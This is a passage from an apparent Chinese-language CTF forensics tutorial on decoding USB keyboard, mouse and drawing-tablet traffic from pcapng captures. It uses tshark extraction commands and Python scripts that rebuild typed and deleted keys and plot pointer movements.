</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>and</span> <span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;2&#39;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>13</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>14</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>15</span><span class=p>]</span><span class=o>!=</span><span class=s1>&#39;0&#39;</span> <span class=ow>or</span> <span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]</span><span class=o>==</span><span class=s2>&#34;00&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>             <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]</span> <span class=ow>in</span> <span class=n>normalKeys</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>line</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;2&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=n>shiftKeys</span><span class=p>[</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]]]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=n>normalKeys</span><span class=p>[</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>]]]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>output</span> <span class=o>+=</span> <span class=p>[</span><span class=s1>&#39;[unknown]&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl><span class=n>keys</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>output</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;&lt;CAP&gt;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=mi>1</span> <span class=o>-</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>flag</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=p>[</span><span class=n>x</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>output</span> <span class=k>if</span> <span class=n>x</span> <span class=o>!=</span> <span class=s1>&#39;&lt;CAP&gt;&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>new_output</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>output</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;&lt;DEL&gt;&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>delete_output</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>new_output</span> <span class=o>=</span> <span class=n>new_output</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>new_output</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 键盘输入的内容为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 键盘删除的内容为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>delete_output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;[+] 最后的结果为：</span><span class=si>{</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>new_output</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>然后有时候还会出现这样一种考点就是：出题人会把关键信息藏在被<code>&lt;DEL></code>的字符中</p><p>因此我们需要把被删除的字符也还原出来</p><h3 class=heading-element id=鼠标流量><span>鼠标流量</span>
<a href=#%e9%bc%a0%e6%a0%87%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>键盘流量的数据常见的长度为4字节、6字节、7字节、8字节</p></blockquote><p>和键盘流量的过程一样，第一步都是先用tshark提取出数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>tshark -r example.pcapng -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>tshark -r example.pcapng -Y <span class=s1>&#39;usb.src == &#34;2.3.1&#34;&#39;</span> -T fields -e usbhid.data <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; data.txt
</span></span><span class=line><span class=cl><span class=c1># -r：指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -Y：使用过滤器</span>
</span></span><span class=line><span class=cl><span class=c1># -T：表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e：指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># sed &#39;/^\s*$/d&#39;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>然后和网上那些教程不同，我这里就自己改了一下脚本，就不用多此一举给数据添加冒号了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_XY</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>posx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>posy</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data.txt&#34;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>14</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=nb>len</span><span class=p>(</span><span class=n>line</span><span class=p>)</span> <span class=o>==</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>2</span><span class=p>:</span><span class=mi>4</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=c1># 1-左键 2-右键 0-nothing</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># 鼠标的移动数据通常是以有符号8位整数的形式存储的，范围是 -128 到 127</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>x</span> <span class=o>&gt;</span> <span class=mi>127</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>x</span> <span class=o>-=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>y</span> <span class=o>&gt;</span> <span class=mi>127</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>y</span> <span class=o>-=</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl>            <span class=c1># 累加距离，算出鼠标当前所在的位置</span>
</span></span><span class=line><span class=cl>            <span class=n>posx</span> <span class=o>+=</span> <span class=n>x</span>
</span></span><span class=line><span class=cl>            <span class=n>posy</span> <span class=o>+=</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>            <span class=c1># 查看鼠标左键/右键/nothing的轨迹</span>
</span></span><span class=line><span class=cl>            <span class=c1># if flag == 0:</span>
</span></span><span class=line><span class=cl>            <span class=c1># if flag == 1:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>flag</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>out</span> <span class=o>+=</span> <span class=nb>str</span><span class=p>(</span><span class=n>posx</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39; &#39;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>posy</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;xy.txt&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>plot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># unpack=True将每列数据分别存储到一个数组中</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>loadtxt</span><span class=p>(</span><span class=s2>&#34;xy.txt&#34;</span><span class=p>,</span><span class=n>delimiter</span><span class=o>=</span><span class=s1>&#39; &#39;</span><span class=p>,</span><span class=n>unpack</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span> <span class=o>-</span><span class=n>y</span><span class=p>,</span> <span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>get_XY</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>plot</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><h3 class=heading-element id=数位板流量分析><span>数位板流量分析：</span>
<a href=#%e6%95%b0%e4%bd%8d%e6%9d%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p><a href=https://goodlunatic.github.io/posts/3f7db4e/#%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-hard_digital_plate target=_blank rel="external nofollow noopener noreferrer">例题1-2022浙江省赛决赛-hard_Digital_plate</a></p><p>例题2-RoarCTF MISC Davinci_Cipher</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 先导出数据并去除空行</span>
</span></span><span class=line><span class=cl>tshark -r hard_Digital_plate.pcapng -T fields -e usb.capdata <span class=p>|</span> sed <span class=s1>&#39;/^\s*$/d&#39;</span> &gt; out.txt
</span></span><span class=line><span class=cl><span class=c1># -r 指定了需要读取的文件</span>
</span></span><span class=line><span class=cl><span class=c1># -T 表示仅仅输出所选字段</span>
</span></span><span class=line><span class=cl><span class=c1># -e 指定提取的字段</span>
</span></span><span class=line><span class=cl><span class=c1># 在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，`d` 表示删除）</span></span></span></code></pre></td></tr></table></div></div><p>类似于：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08803708951e000000000000
</span></span><span class=line><span class=cl>08813708951e650000000000
</span></span><span class=line><span class=cl>08813808951ec10000000000
</span></span><span class=line><span class=cl>08813908951e2e0100000000
</span></span><span class=line><span class=cl>08813a08951e940100000000
</span></span><span class=line><span class=cl>08813b08951ee20100000000
</span></span><span class=line><span class=cl>08813c08951e1c0200000000
</span></span><span class=line><span class=cl>08813c08951e440200000000
</span></span><span class=line><span class=cl>08813c08951e610200000000</span></span></code></pre></td></tr></table></div></div><p>需要我们根据设备的传输协议来分析出对应的xy坐标以及压感数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>matplotlib.pyplot</span> <span class=k>as</span> <span class=nn>plt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;data.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>lines</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>draw_pic1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>16</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>x</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>6</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>6</span><span class=p>],</span><span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>y</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>*</span> <span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>10</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span><span class=mi>16</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>line</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>10</span><span class=p>],</span><span class=mi>16</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>plot</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>,</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>plt</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>draw_pic2</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>y</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>press_lst</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>lines</span><span class=p>:</span>
